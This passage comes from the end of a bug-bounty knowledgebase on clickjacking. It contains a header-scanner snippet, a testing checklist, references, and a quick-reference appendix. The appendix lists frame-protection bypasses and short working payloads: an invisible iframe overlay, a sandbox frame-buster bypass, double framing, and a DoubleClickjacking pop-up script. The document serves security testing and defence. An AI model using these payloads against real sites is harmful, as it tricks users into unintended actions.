        cookies = resp.headers.get('set-cookie', '')
        if 'samesite' not in cookies.lower():
            findings.append({
                'type': 'MISSING_SAMESITE',
                'severity': 'MEDIUM',
                'detail': 'Session cookies missing SameSite attribute'
            })
            
    except Exception as e:
        findings.append({
            'type': 'ERROR',
            'severity': 'INFO',
            'detail': str(e)
        })
    
    return findings
```

### 30.2 Manual Testing Checklist

```
□ Step 1: Header Analysis
  □ Check for X-Frame-Options
  □ Check for CSP frame-ancestors
  □ Check cookie SameSite attributes
  □ Check for frame-busting scripts

□ Step 2: Frameability Test
  □ Create test HTML with iframe pointing to target
  □ Verify page loads in iframe
  □ Check for JavaScript errors
  □ Test with different browsers

□ Step 3: Sensitive Action Identification
  □ Find buttons/links for state-changing actions
  □ Check if forms can be prefilled via GET
  □ Identify OAuth/authorization flows
  □ Look for file upload/download buttons

□ Step 4: PoC Development
  □ Position iframe over decoy content
  □ Align target button with decoy button
  □ Test opacity values (0.0001 - 0.1)
  □ Verify click triggers intended action

□ Step 5: Impact Assessment
  □ Determine what attacker can achieve
  □ Check if authentication is required
  □ Test with authenticated session
  □ Assess business impact

□ Step 6: Bypass Testing
  □ Test sandbox attribute bypass
  □ Test double-frame nesting
  □ Test onBeforeUnload bypass
  □ Test DoubleClickjacking if protections exist
```

### 30.3 Browser Developer Tools Detection

```javascript
// Console commands to detect clickjacking protection
// Check X-Frame-Options
fetch('/').then(r => console.log('XFO:', r.headers.get('X-Frame-Options')));

// Check CSP
fetch('/').then(r => console.log('CSP:', r.headers.get('Content-Security-Policy')));

// Check if framed
console.log('Framed:', window.self !== window.top);

// Check frame ancestors
console.log('Parent:', window.parent.location.href);
```

---

## 31. References

### 31.1 Official Documentation

- [PortSwigger Web Security Academy - Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [OWASP Clickjacking Attack Page](https://owasp.org/www-community/attacks/Clickjacking)
- [MDN X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)
- [MDN iframe element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)
- [MDN postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [MDN Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

### 31.2 Research Papers

- [Microsoft Research: Clickjacking - Attacks and Defenses](https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/clickjacking.pdf)
- [NDSS: Attacking and Defending postMessage in HTML5 Websites](https://www.ndss-symposium.org/wp-content/uploads/2017/09/04_5.pdf)
- [RFC 7034: X-Frame-Options](https://tools.ietf.org/html/rfc7034)
- [W3C CSP Level 2 - frame-ancestors](https://w3c.github.io/webappsec-csp/#directive-frame-ancestors)

### 31.3 GitHub Resources

- [PayloadsAllTheThings - Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)
- [OWASP CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries)
- [clickjacking-payload-list](https://github.com/payloadbox/clickjacking-payload-list)
- [projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

### 31.4 Bug Bounty Writeups

- [Clickjacking Exploitation Guide - InfoSec Writeups](https://infosecwriteups.com/clickjacking-exploitation-guide-9f2b4d5f6e1d)
- [Advanced Clickjacking Techniques - Medium](https://medium.com/@filedescriptor/advanced-clickjacking-techniques-and-ui-redressing-3e7d2b1d4f2e)
- [DoubleClickjacking - Paulos Yibelo](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html)
- [DOM-Based Extension Clickjacking - Marek Toth](https://marektoth.com/blog/dom-based-extension-clickjacking/)

### 31.5 Tools

- [Burp Suite Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Clickjack Scanner](https://github.com/machine1337/clickjack)

---

## Appendix A: Quick Reference Card

### A.1 Header Quick Reference

| Protection | Header | Value | Effectiveness |
|-----------|--------|-------|--------------|
| X-Frame-Options | `X-Frame-Options` | `DENY` | Strong |
| X-Frame-Options | `X-Frame-Options` | `SAMEORIGIN` | Medium |
| X-Frame-Options | `X-Frame-Options` | `ALLOW-FROM` | Weak (obsolete) |
| CSP | `Content-Security-Policy` | `frame-ancestors 'none'` | Strong |
| CSP | `Content-Security-Policy` | `frame-ancestors 'self'` | Medium |
| Cookies | `Set-Cookie` | `SameSite=Strict` | Strong (for auth) |
| Cookies | `Set-Cookie` | `SameSite=Lax` | Medium |

### A.2 Bypass Quick Reference

| Defense | Bypass Technique | Success Rate |
|---------|-----------------|--------------|
| X-Frame-Options | DoubleClickjacking | 100% |
| frame-ancestors | DoubleClickjacking | 100% |
| Frame Buster | Sandbox attribute | High |
| Frame Buster | Double framing | High |
| Frame Buster | onBeforeUnload | Medium |
| SameSite=Strict | Non-auth actions | N/A |
| SameSite=Lax | GET-based actions | Medium |

### A.3 Payload Quick Reference

```html
<!-- Basic -->
<iframe src="TARGET" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>

<!-- Sandbox bypass -->
<iframe src="TARGET" sandbox="allow-forms allow-scripts"></iframe>

<!-- Double frame -->
<iframe src="attacker2.html"></iframe>

<!-- DoubleClickjacking -->
<script>let w; onclick=()=>{w=window.open('/shim','p','width=360,height=240'); onmousemove=e=>{try{w.moveTo(e.screenX,e.screenY)}catch{}}; window.open('','p')};</script>

<!-- Drag-and-drop -->
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','DATA')">Drag me</div>
```

---

> **End of Knowledgebase**
> 
> This document was generated from comprehensive analysis of PortSwigger Web Security Academy, OWASP, PayloadsAllTheThings, HackTricks, Microsoft Research, and cutting-edge 2024-2025 security research.
> 
> **Last Updated**: 2025-06-23
> **Version**: 1.0
> **Classification**: Research-Grade Bug Bounty Reference